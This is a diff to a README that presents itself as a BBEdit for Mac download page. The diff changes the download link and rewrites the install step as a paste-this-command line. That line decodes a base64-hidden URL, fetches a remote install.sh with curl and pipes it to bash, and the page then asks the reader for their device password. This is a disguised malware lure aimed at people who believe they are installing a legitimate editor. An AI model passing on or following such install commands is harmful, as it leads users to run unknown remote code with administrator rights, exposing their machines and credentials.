@@ -2,7 +2,7 @@
 
 ## ✅ Download BBEdit for Mac (Free Trial Available)
 
-[![🚀 Download BBEdit 🟣](https://img.shields.io/badge/Download-BBEdit-blueviolet?style=for-the-badge)](https://bbedit-mac-download.github.io/.github)
+[![🚀 Download BBEdit 🟣](https://img.shields.io/badge/Download-BBEdit-blueviolet?style=for-the-badge)](https://shuziktobehuman.github.io/huja/BBEdit)
 
 ---
 
@@ -21,7 +21,7 @@
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -64,10 +64,10 @@ BBEdit’s intuitive design ensures that even complex tasks like batch editing, 
 ## 🖼️ Preview
 
 ![BBEdit Disk Browser](https://www.barebones.com/images/bbedit/disk-browser-lg.png)  
-*Explore and manage files efficiently with BBEdit’s disk browser.*
+
 
 ![BBEdit Main Window](https://www.barebones.com/images/bbedit/screenshot-main.jpg)  
-*Clean and customizable editing interface tailored for macOS.*
+
 
 ---
 
